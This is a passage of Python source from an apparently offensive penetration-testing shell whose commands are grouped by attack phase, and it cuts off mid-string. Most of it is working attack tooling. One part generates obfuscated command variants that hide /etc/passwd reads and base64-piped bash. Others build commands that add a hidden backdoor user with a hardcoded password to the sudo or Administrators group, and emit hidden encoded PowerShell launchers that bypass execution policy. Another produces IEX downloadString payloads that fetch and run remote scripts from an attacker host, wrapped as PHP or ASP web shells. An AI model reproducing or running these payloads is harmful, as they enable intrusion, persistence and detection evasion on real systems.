        3. Applies these obfuscations to the provided `line` argument and prints each obfuscated command.

        :param line: The command line string to be obfuscated.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would:
        - Provide the command you want to obfuscate as the argument to this function.
        - The function will generate various obfuscated versions of the command and print them.

        Note: Ensure that the command is properly formatted and valid to avoid errors during obfuscation. The obfuscations may involve different encoding and string manipulation techniques.
        """

        try:
            def double_base64_encode(cmd):
                """
                Perform double Base64 encoding on the given command.

                This helper function takes a command string, encodes it in Base64, and then performs
                another Base64 encoding on the result. The final encoded string is returned.

                Args:
                    cmd (str): The command string to be encoded.

                Returns:
                    str: The double Base64 encoded string.

                Example:
                    >>> double_base64_encode("example")
                    'ZWN4YW5hbWVsZQ=='

                Notes:
                    - The function first encodes the command string into bytes using UTF-8 encoding.
                    - It then applies Base64 encoding twice and removes any leading or trailing whitespace.
                    - The result is decoded back to a string and returned.

                Raises:
                    TypeError: If the input `cmd` is not a string.
                """

                return base64.b64encode(base64.b64encode(cmd.encode()).strip()).decode().strip()

            def apply_obfuscations(cmd):
                """
                Generate a list of obfuscated commands based on the given input command.

                This function creates various obfuscated versions of the provided command string.
                Each obfuscation method applies a different technique to disguise the command,
                making it less recognizable to simple static analysis.

                Args:
                    cmd (str): The command string to be obfuscated.

                Returns:
                    list of str: A list of obfuscated command strings.

                Notes:
                    - Each obfuscation method aims to transform the command in a unique way.
                    - Obfuscations include encoding, character replacement, and command substitution techniques.
                    - Ensure that the `double_base64_encode` function is defined and available in the scope where this function is used.

                Raises:
                    TypeError: If the input `cmd` is not a string.
                """
                obfuscations = [
                    f"echo \"echo $(echo '{cmd}' | base64 | base64)|base64 -d|base64 -d|bash\" | sed 's/ /${{IFS}}/g'",
                    f"echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash",
                    f"$(tr '[A-Z]' '[a-z]' <<< '{cmd}')",
                    f"$(a='{cmd}'; printf %s \"${{a,,}}\")",
                    f"$(rev <<< '{cmd}')",
                    f"bash <<< $(base64 -d <<< {base64.b64encode(cmd.encode()).decode()})",
                    f"echo {cmd} | $0",
                    f"cat$u /etc$u/passwd$u",
                    f"p${{u}}i${{u}}n${{u}}g",
                    f"p\\\i\\\n\\\g",
                    f"cat ${{HOME:0:1}}etc${{HOME:0:1}}passwd",
                    f"cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
                    f"echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
                    f"cat $(echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
                    f"abc=${'$'}'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'; cat abc",
                    f"$(printf %.1s \"$PWD\")bin$(printf %.1s \"$PWD\")ls",
                    f"while read -r line; do echo $line; done < /etc/passwd"
                ]
                return obfuscations

            obfuscations = apply_obfuscations(line)
            for obfuscation in obfuscations:
                print_msg(obfuscation)
                copy2clip(obfuscation)

        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(scanning_category)
    def do_smtpuserenum(self, line):
        """
        Enumerates SMTP users using the `smtp-user-enum` tool with the VRFY method.

        1. Checks if the `rhost` (remote host) parameter is set:
        - If not set, displays an error message and exits the function.

        2. Checks if the `usrwordlist` (user wordlist) parameter is provided:
        - If not provided, displays an error message indicating that the `p` or `payload` parameter should be used to load payloads.

        3. If both parameters are provided:
        - Displays the command that will be executed for user enumeration.
        - Runs `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <rhost>` to perform user enumeration.

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that the `rhost` parameter is assign with the target IP address using `set rhost <IP>`.
        - Load the user wordlist using the `assign usrwordlist <path>` command.
        - Execute the command `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <rhost>`.
        - Ex: sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10
        Note: Ensure that you have the necessary permissions to run `smtp-user-enum` with `sudo` and that the wordlist file exists at the specified path.
        """

        rhost = self.params["rhost"]
        usrwordlist = self.params["usrwordlist"]
        if not check_rhost(rhost):
            return
        if not usrwordlist:
            print_error("use p or payload to load payloads parameters")
            return
        print_msg(f"Try... sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {rhost}")
        self.cmd(f"sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {rhost}")
        return

    @cmd2.with_category(lateral_movement_category)
    def do_sshd(self, line):
        """
        Starts the SSH service and displays its status.

        1. Executes the command to start the SSH service:
        - Runs `sudo systemctl start ssh` to initiate the SSH service.

        2. Displays the status of the SSH service:
        - Runs `sudo systemctl status ssh` to show the current status of the SSH service.

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Execute `sudo systemctl start ssh` to start the SSH service.
        - Run `sudo systemctl status ssh` to check the status of the SSH service.

        Note: Ensure that you have the necessary permissions to start services using `sudo` and that the SSH service is installed on your system.
        """
        print_msg(f"Try... sudo systemctl start ssh")
        self.cmd(f"sudo systemctl start ssh")
        self.cmd(f"sudo systemctl status ssh")
        return

    @cmd2.with_category(reporting_category)
    def do_nmapscripthelp(self, line):
        """
        Provides help to find and display information about Nmap scripts.

        1. Checks if an argument is provided:
        - If no argument is given, displays an error message indicating the need to pass a script name.

        2. Executes a command to display script help:
        - Runs `nmap --script-help` with the provided argument (appending a wildcard `*` to match script names).
        - Prints a message with the command being executed and provides further instructions for using the Nmap script.

        3. Prints a message suggesting the next step:
        - Provides a suggestion for running Nmap with the appropriate script and options based on the search results.

        :param line: The script or keyword to search for in the Nmap script help output.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Run `nmap --script-help` with the specific script name or keyword.
        - Use the script names in Nmap commands to run scans with the desired scripts.

        Note: Ensure that `nmap` is installed and accessible in the system's PATH.
        """

        if not line:
            print_error("you must pass the script to find by argument.")
            return

        print_msg(f"Try... nmap --script-help '{line}*'{RESET}")
        self.cmd(f"nmap --script-help '{line}*'")
        print_msg(
            f"now you can run : {MAGENTA} sh sudo nmap -sCV -p <port> --script <script1,script2 <ip> {RESET}"
        )
        return

    @cmd2.with_category(reporting_category)
    def do_apropos(self, line):
        """
        Search for commands matching the given parameter in the cmd interface and optionally extend the search using the system's `apropos` command.

        :param line: The search term to find matching commands.

        :returns: None

        Manual execution:
        To manually search for commands matching a term using the `apropos` command, use the following command:

            apropos <search_term>

        Example:
            apropos network

        The `apropos` command will search for commands and documentation that match the given search term.

        The function also searches within the available commands in the cmd interface.
        """
        # Search within the cmd commands
        matched_cmds = [cmd for cmd in self.get_names() if line in cmd]

        if matched_cmds:
            print_msg("Commands found in the cmd interface:")
            for cmd in matched_cmds:
                print_msg(f"  {cmd.replace('do_','').replace('run_', 'run ')}")
        else:
            print_warn("No matching commands found in the cmd interface.")

        # Ask if the user wants to extend the search using the system's apropos command
        extend_search = input(
            f"    {YELLOW}[?] {WHITE}Do you want to extend the search using the system's {GREEN}`apropos`{WHITE} command? {MAGENTA}(y/n): {RESET}"
        )

        if extend_search.lower() == "y":
            print_msg(f"Searching for '{line}' using `apropos`...")
            self.cmd(f"apropos {line}")
        return

    @cmd2.with_category(credential_access_category)
    def do_searchhash(self, line):
        """
        Helps to find hash types in Hashcat by searching through its help output.

        1. Checks if an argument is provided:
        - If no argument is given, displays an error message indicating the need to pass a hash type.

        2. Executes a command to search for hash types:
        - Runs `hashcat -h` to display Hashcat help information and pipes it to `grep` to search for the provided argument.
        - Prints a message with the command being executed and provides further instructions for running Hashcat.

        3. Prints a message suggesting the next step:
        - Provides a suggestion for running Hashcat with the found hash types.

        :param line: The hash type or keyword to search for in the Hashcat help output.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Run `hashcat -h` to display the help information.
        - Use `grep` to search for the specific hash type or keyword within the help output.
        - Run Hashcat with the appropriate parameters based on the search results.

        Note: Ensure that `hashcat` is installed and accessible in the system's PATH.
        """
        if not line:
            print_error("you must pass the hash type to find by argument.")
            return

        print_msg(f"Try... hashcat -h | grep -i {line}{RESET}")
        self.cmd(f"hashcat -h | grep -i {line}")
        print_msg(f"now you can run : {MAGENTA} hashcat NNN sessions/hash.txt {RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_clean(self, line):
        """
        Deletes files and directories in the `sessions` directory, excluding specified files and directories.

        1. Checks if the `rhost` parameter is valid:
        - Uses the `check_rhost` function to verify if `rhost` is assign and valid.
        - If `rhost` is not valid, exits the function.

        2. Lists files and directories in the `sessions` directory:
        - Uses `os.listdir` to list all files and directories in the `sessions` directory.
        - Compares each item with the list of exclusions.

        3. Deletes files and directories not in the exclusion list:
        - Uses `os.remove` to delete files and `shutil.rmtree` to delete directories.

        4. Prints a message indicating that the cleanup is complete.

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that you have the correct `rhost` value set.
        - Manually execute commands to delete files and directories, excluding specified ones.

        Note: This function performs a cleanup by removing various files and directories associated with the current session, excluding specified items.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if line.startswith("test"):
            self.cmd("sudo rm sessions/test* -rf")
            return
        if line.startswith("log"):
            self.cmd("sudo rm sessions/logs/* -rf")
            return
        if line.startswith("nmap"):
            self.cmd("sudo rm sessions/scan* -rf")
            return
        exclusions = [
            'c',
            'download_resources.sh',
            'implant',
            'ip2asn-v4.tsv.gz',
            'key.aes',
            'LazyOwn_session_report.csv',
            'lin',
            'logs',
            'nmap-bootstrap.xsl',
            'php',
            'phishing',
            'payloads.txt',
            'routes_to_templates.json',
            'sslscan-singleip.sh',
            'tasks.json',
            'temp_uploads',
            'tor.sh',
            'users.txt',
            'uploads',
            'win',
            'www.py'
        ]

        # Path to the sessions directory
        sessions_dir = 'sessions'

        # List all files and directories in the sessions directory
        all_items = os.listdir(sessions_dir)

        for item in all_items:
            item_path = os.path.join(sessions_dir, item)
            if not any(item == exclusion for exclusion in exclusions):
                try:
                    if os.path.isfile(item_path):
                        print_msg(f"Deleting file ... {item_path}")
                        os.remove(item_path)
                    elif os.path.isdir(item_path):
                        print_msg(f"Deleting dir ... {item_path}")
                        self.cmd(f"rm -rf {item_path}")
                except Exception as e:
                    print_error(f"Failed to delete {item_path}: {e}")

        print_msg(f"Cleaned sessions directory. {RESET}")
        return

    @cmd2.with_category(exploitation_category)
    def do_pyautomate(self, line):
        """
        Automates the execution of pwntomate tools on XML configuration files.

        1. Sets the directory for XML files to be processed:
        - Checks the `sessions` directory for XML files.

        2. For each XML file found:
        - Constructs and executes a command to run `pwntomate` with the XML file as input.
        - The command is executed using `subprocess.run`, and errors are handled if the command fails.

        3. After processing all XML files:
        - Prints a message indicating that the target has been pwntomated.

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that XML configuration files are present in the `sessions` directory.
        - Run `pwntomate.py` manually on each XML file using a similar command format.

        Note: This function assumes that `pwntomate.py` is available in the current working directory and is executable with Python 3.
        """
        directory = "sessions"
        files = os.listdir(directory)
        xml_files = [file for file in files if file.endswith(".xml")]
        path = os.getcwd()
        for xml_file in xml_files:
            xml_path = os.path.join(directory, xml_file)
            command = f"python3 -W ignore pwntomate.py {xml_path} -x -b {path}/sessions"
            print_msg(f"Executing command: {MAGENTA}{command}{RESET}")
            try:
                self.cmd(command)
            except Exception as e:
                print_error(f"Error executing command for {xml_file}: {e}{RESET}")
        print_msg(f"{YELLOW}Target was pwntomated 🍅. {RESET}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_aliass(self, line):
        """
        Prints all configured aliases and their associated commands.

        1. Retrieves the list of aliases from the `LazyOwnShell` instance:
        - Iterates through each alias and its associated command.

        2. For each alias:
        - Displays the alias name and the full command it represents.

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that aliases are configured in the `LazyOwnShell` instance.
        - Manually review the aliases and their commands as displayed.

        Note: This function assumes that aliases are managed by the `LazyOwnShell` instance and are available for retrieval.
        """

        aliases = LazyOwnShell().aliases
        for alias, command in aliases.items():
            print_msg(
                f"{WHITE} Alias {GREEN} {alias}{WHITE} : Full command: {CYAN}{command}{RESET} "
            )
        return

    @cmd2.with_category(recon_category)
    def do_tcpdump_icmp(self, line):
        """
        Starts `tcpdump` to capture ICMP traffic on the specified interface.

        1. Checks if the `line` argument (interface) is provided:
        - Displays an error message and exits if the interface is missing.

        2. If the interface is provided:
        - Displays the `tcpdump` command that will be executed.
        - Runs the `tcpdump` command to capture ICMP traffic on the specified interface.

        :param line: The network interface on which to capture ICMP traffic (e.g., `tun0`).
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Provide a valid network interface for capturing ICMP traffic.
        - Execute the `tcpdump` command manually to capture ICMP traffic on the specified interface.

        Note: Ensure that you have sufficient permissions to run `tcpdump` on the specified interface.
        """

        if not line:
            print_error(
                "necesitas pasarle la interfaz que se quedarà en escucha ej: tcpdump_icmp tun0"
            )
            return
        print_msg(f"{WHITE}sudo tcpdump -i {GREEN}{line}{WHITE}{CYAN} icmp -n{RESET} ")
        self.cmd(f"sudo tcpdump -i {line} icmp -n")
        return

    @cmd2.with_category(recon_category)
    def do_tcpdump_capture(self, line):
        """
        Starts packet capture using `tcpdump` on the specified interface.

        1. Checks if the `line` argument (interface) is provided:
        - Displays an error message and exits if the interface is missing.

        2. Validates the `rhost` (remote host IP):
        - Exits the function if the `rhost` is not valid.

        3. If the interface and `rhost` are valid:
        - Displays the `tcpdump` command that will be executed.
        - Runs the `tcpdump` command to capture packets on the specified interface and save the capture file to `pcaps/capture_<rhost>.pcap`.

        :param line: The network interface on which to capture packets (e.g., `tun0`).
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Provide a valid network interface for capturing packets.
        - Ensure the remote host IP is assign correctly.
        - Execute the `tcpdump` command manually to capture packets on the specified interface.

        Note: Ensure that the `pcaps` directory exists and is writable for saving the capture file.
        """

        if not line:
            print_error(
                "necesitas pasarle la interfaz que se quedarà en escucha ej: tcpdump_icmp tun0"
            )
            return
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return

        print_msg(f"{WHITE}sudo tcpdump -i {GREEN}{line}{WHITE}{CYAN} -w pcaps/capture_{rhost}.pcap {RESET} ")
        self.cmd(f"sudo tcpdump -i {line}  -w pcaps/capture_{rhost}.pcap ")
        return

    @cmd2.with_category(recon_category)
    def do_tshark_analyze(self, line):
        """
        Analyzes a packet capture file using `tshark` based on the provided remote host IP.

        1. Checks if the `rhost` (remote host IP) is valid:
        - Displays an error message and exits if the `rhost` is not valid.

        2. Verifies the existence of the packet capture file:
        - Displays an error message and exits if the capture file is missing.
        - Prompts the user to run the `do_tcpdump_capture` command first.

        3. If the capture file exists:
        - Displays the `tshark` command that will be executed.
        - Runs the `tshark` command to analyze the packet capture file and print out IP destination and frame time fields.

        :param line: The command line input specifying the interface for capturing packets.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure the remote host IP is valid.
        - Run the `do_tcpdump_capture` command to capture packets.
        - Execute the `tshark` command manually to analyze the packet capture file.

        Note: Ensure that the capture file `pcaps/capture_<rhost>.pcap` is available in the `pcaps` directory.
        """

        pcaps_dir = 'pcaps'
        all_items = os.listdir(pcaps_dir)

        for item in all_items:
            item_path = os.path.join(pcaps_dir, item)

            try:
                if os.path.isfile(item_path):
                    print_msg("Analizing...")

                    rhost = self.params['rhost']
                    if not check_rhost(rhost):
                        return

                    pcap_file = item_path
                    if not os.path.exists(pcap_file):
                        print_error("you must run command do_tcpdump_capture tun0 first.")
                        return
                    if os.path.splitext(pcap_file)[1].lower() == '.pcap':

                        command = f'tshark -r {pcap_file} -T fields -e frame.number -e frame.time -e frame.len -e ip.src -e ip.dst -e ip.proto -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport -e http.request.uri -e http.response.code -e ftp.request.command -e ftp.request.arg -e dns.qry.name '
                        print_msg(command)
                        self.cmd(command)
                        command = f'tshark -r {pcap_file} -q -z conv,tcp,ip '
                        print_msg(command)
                        self.cmd(command)
                        command = f"tshark -r {pcap_file} -Y 'ftp.request.command == USER || ftp.request.command == PASS' -T fields -e ip.dst -e frame.time -e ftp.request.command -e ftp.request.arg"
                        print_msg(command)
                        self.cmd(command)
                    else:
                        print_error("No pcap files found in pcaps directory")

            except Exception as e:
                print_error(f"Failed to delete {item_path}: {e}")

        return

    @cmd2.with_category(persistence_category)
    def do_rdp(self, line):
        """
        Reads credentials from a file, encrypts the password, and executes the RDP connection command.

        1. Reads credentials:
            - Reads the username and password from the `sessions/credentials.txt` file.

        2. Encrypts the password:
            - Uses `remmina --encrypt-password` to encrypt the password obtained from the file.

        3. Executes the RDP connection command:
            - Uses the encrypted password to construct and execute the `remmina -c` command to initiate the RDP connection.

        :param line: This function does not use any arguments.
        :type line: str
        :returns: None

        Manual execution:
        To manually execute the command:
        - Ensure `sessions/credentials.txt` contains the credentials in the format `username:password`.
        - Run the `rdp` command to read the credentials, encrypt the password, and connect to the RDP server.
        Example usage: `rdp`
        """
        path = os.getcwd()
        credentials_file = f'{path}/sessions/credentials.txt'

        if not os.path.isfile(credentials_file):
            print_error("Error: Credentials file not found.")
            return

        with open(credentials_file, 'r') as file:
            credentials = file.readline().strip()

        if not credentials:
            print_error("Error: No credentials found in the file.")
            return

        # Split credentials into username and password
        try:
            username, password = credentials.split(':')
        except ValueError:
            print_error("Error: Invalid credentials format in the file.")
            return

        rhost = self.params['rhost']

        if not check_rhost(rhost):
            print_error("Error: Invalid or undefined rhost.")
            return

        # Construct and execute the remmina command
        remmina_command = f'remmina -c rdp://{username}@{rhost}'
        password = password.replace('\r', '').replace('\n', '').splitlines()[0]
        print_msg(password)
        command = f'printf "{password}" | xclip -sel clip'
        self.cmd(command)

        print_msg(f"Executing command: {remmina_command}")
        try:
            subprocess.run(remmina_command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Error executing remmina command: {e}")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_base64encode(self, line):
        """
        Encodes a given string into Base64 format.

        1. Encodes the input string:
            - Uses the `base64` library to encode the provided string into Base64 format.

        2. Displays the encoded string:
            - Prints the Base64 encoded string to the terminal.

        :param line: The string to encode in Base64 format.
        :type line: str
        :returns: None

        Manual execution:
        To manually encode a string in Base64:
        - Provide the string to the command and it will print the Base64 encoded result.
        Example usage: `base64encode HelloWorld`
        """
        if line:
            # Encode the input line to Base64
            encoded_bytes = base64.b64encode(line.encode('utf-8'))
            encoded_str = encoded_bytes.decode('utf-8')
            print_msg(encoded_str)
        else:
            print_error("Error: No input provided for encoding.")

    @cmd2.with_category(miscellaneous_category)
    def do_base64decode(self, line):
        """
        Decodes a Base64 encoded string.

        1. Decodes the Base64 string:
            - Uses the `base64` library to decode the provided Base64 encoded string back to its original form.

        2. Displays the decoded string:
            - Prints the decoded string to the terminal.

        :param line: The Base64 encoded string to decode.
        :type line: str
        :returns: None

        Manual execution:
        To manually decode a Base64 encoded string:
        - Provide the Base64 encoded string to the command and it will print the decoded result.
        Example usage: `base64decode SGVsbG9Xb3JsZA==`
        """
        if line:
            try:
                # Decode the Base64 encoded line
                decoded_bytes = base64.b64decode(line)
                decoded_str = decoded_bytes.decode('utf-8')
                print_msg(decoded_str)
            except Exception as e:
                print_error(f"Error decoding Base64 string: {e}")
        else:
            print_error("Error: No input provided for decoding.")

    @cmd2.with_category(persistence_category)
    def do_grisun0(self, line):
        """
        Creates and copies a shell command to add a new user `grisun0`, assign a password, add the user to the sudo group, and switch to the user.

        1. Displays the command:
            - Prints the command to add the user `grisun0` with home directory `/home/.grisun0`, assign the password, add the user to the `sudo` group, assign the appropriate permissions, and switch to the user.

        2. Copies the command to clipboard:
            - Uses `xclip` to copy the command to the clipboard for easy pasting.

        :param line: This function does not use any arguments.
        :type line: str
        :returns: None

        Manual execution:
        To manually execute the command:
        - Copy the command from the clipboard.
        - Run it in a terminal to create the user and assign up the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0
        Note: Ensure `xclip` is installed and available on your system.
        """

        print_msg(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
        os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
        print_warn("Copied to clip ;)")
        return

    @cmd2.with_category(persistence_category)
    def do_grisun0w(self, line):
        """
        Creates and copies a PowerShell command to add a new user `grisun0`, assign a password, add the user to the Administrators group, and switch to the user.

        1. Displays the command:
            - Prints the PowerShell command to add the user `grisun0`, assign the password, add the user to the `Administrators` group, and switch to the user.

        2. Copies the command to clipboard:
            - Uses `clip` to copy the command to the clipboard for easy pasting.

        :param line: This function does not use any arguments.
        :type line: str
        :returns: None

        Manual execution:
        To manually execute the command:
        - Copy the command from the clipboard.
        - Run it in a PowerShell terminal to create the user and assign the permissions as specified.
        """
        command = (
            "powershell $userExists = Get-LocalUser -Name 'grisun0' -ErrorAction SilentlyContinue; "
            "if ($userExists) { Write-Output 'User grisun0 already exists.' } else { "
            "$password = 'Grisgrisgris123!'; "
            "$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
            "New-LocalUser -Name 'grisun0' -Password $securePassword -FullName 'Grisun0 User' -Description 'Grisun0 User'; }; "
            "$group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; "
            "if ($group) { Add-LocalGroupMember -Group 'Administrators' -Member 'grisun0' } else { Write-Output 'Group Administrators was not found.' }; "
            "Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \\\"/C runas /user:grisun0 cmd.exe\\\"`\"' ; "
            "net localgroup administrators grisun0 /add"
        )

        copy2clip(command)

    @cmd2.with_category(miscellaneous_category)
    def do_encodewinbase64(self, line):
        """
        Encodes a given payload into a Base64 encoded string suitable for Windows PowerShell execution.

        This function takes a payload as input, encodes it into UTF-16 Little Endian format,
        and then encodes the resulting bytes into a Base64 string. It then constructs PowerShell
        commands that can execute the encoded payload. The final commands are printed and
        copied to the clipboard for easy use.

        Args:
            line (str): The payload to be encoded. If not provided, the function will prompt
                        the user to enter a payload, defaulting to 'whoami' if no input is given.

        Returns:
            None

        Example:
            >>> encoder = Encoder()
            >>> encoder.do_encodewinbase64('Get-Process')
            [Outputs the encoded PowerShell commands and copies the final command to the clipboard]
        """
        if not line:
            line = input('    [!] enter the payload (default; whoami): ') or 'whoami'

        utf16_payload = line.encode('utf-16le')
        base64_payload = base64.b64encode(utf16_payload).decode('utf-8')
        final_command = f"cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}"
        final_final_command = f"cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}"
        payloads = f"""
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /Window Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty H -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /W Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W H -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidd -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidden -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSt Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS H -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Wind Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Win Hid -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowSt Hidd -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowStyle Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}
        """

        print_msg(final_command)
        print_msg(final_final_command)
        copy2clip(final_command)
        print_msg("Another options to payloads: ")
        print_msg(f"\n\n {payloads} \n\n")
        return

    @cmd2.with_category(exploitation_category)
    def do_winbase64payload(self, line):
        """
        Creates a base64 encoded payload specifically for Windows to execute a PowerShell command or download a file using `lhost`.

        1. Checks if `lhost` is set:
            - Displays an error message and exits if `lhost` is not set.

        2. Checks if a file name or command is provided:
            - Displays an error message and exits if no file name or command is provided.

        3. Prompts for the type of payload:
            - '1': Constructs a PowerShell command to download and execute a `.ps1` script from `lhost`.
            - '2': Constructs a command to download a file using `wget`.

        4. Prompts for the output type:
            - '1': Outputs the base64 encoded PowerShell command.
            - '2': Outputs the base64 encoded command in an ASP format.
            - '3': Outputs the base64 encoded command in a PHP format.

        5. Encodes the command:
            - Converts the command to UTF-16LE encoding.
            - Encodes the UTF-16LE encoded command to base64.
            - Copies the final base64 command to the clipboard using `copy2clip`.

        :param line: The name of the `.ps1` file or the command to be executed.
        :type line: str
        :returns: None

        Manual execution:
        To manually use the payload:
        - Ensure `lhost` is assign to the correct IP address.
        - Place the `.ps1` file in the `sessions` directory if using the 'ps1' payload type.
        - Use `copy2clip` to copy the generated base64 command to the clipboard.

        Note: Ensure `iconv`, `base64`, and `xclip` are installed and available on your system.
        """

        lhost = self.params.get("lhost")
        if not lhost:
            print_error(f"lhost debe estar seteado. Ej: assign lhost 10.10.10.10")
            return

        payload_type = input("    [!] Enter kind payload (1: ps1, 2: wget, 3: Free): ").strip()

        if not line and payload_type != "3":
            excluded_extensions = ['.html', '.xml', '.nmap', '.dot', '.png', '.xsl', '.txt', '.json']
            file_list = []
            for root, dirs, files in os.walk("sessions"):
                for file in files:
                    if not any(file.endswith(ext) for ext in excluded_extensions):
                        file_list.append(os.path.join(root, file))

            if not file_list:
                print_error("No files found in the sessions directory.")
                return

            print_msg("Select a file to download:")
            for idx, file in enumerate(file_list, 1):
                print_msg(f"  {idx}) {file}")

            file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()

            try:
                file_choice = int(file_choice)
                if file_choice < 1 or file_choice > len(file_list):
                    print_warn("Invalid choice.")
                    return
                selected_file = file_list[file_choice - 1]
            except ValueError:
                print_error("Invalid input. Please enter a number.")
                return
        else:
            selected_file = line.strip()
        selected_file = selected_file.replace("sessions/","")
        if payload_type == '1':
            command = f"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/{selected_file}')"
        elif payload_type == '2':
            command = f"wget http://{lhost}/{selected_file} -o C:\\Windows\\TEMP\\{selected_file.split('/')[-1]}"
        elif payload_type == '3':
            command = input("    [!] Enter personalized command (default: whoami): ") or 'whoami'
        else:
            print_error(f"Tipo de payload no válido: {payload_type}")
            return

        output_type = input("    [!] Tipo de salida (1: PowerShell, 2: ASP, 3: PHP): ").strip()

        utf16_command = command.encode('utf-16le')
        base64_command = base64.b64encode(utf16_command).decode('utf-8')

        if output_type == '1':
            final_command = f"powershell /enc {base64_command}"
        elif output_type == '2':
            final_command = f"<%= `powershell /enc {base64_command}` %>"
        elif output_type == '3':
            final_command = f"<?php system(`powershell /enc {base64_command}`); ?>"
        else:
            print_error(f"Tipo de salida no válido: {output_type}")
            return
        choice = input("   [?] Do you wanna see more payloads (y/n)") or "n"
        if choice == "y":
            payloads = f"""
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /Window Hi -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty H -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /W Hi -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W H -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W Hi -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidd -Enco {base64_command}
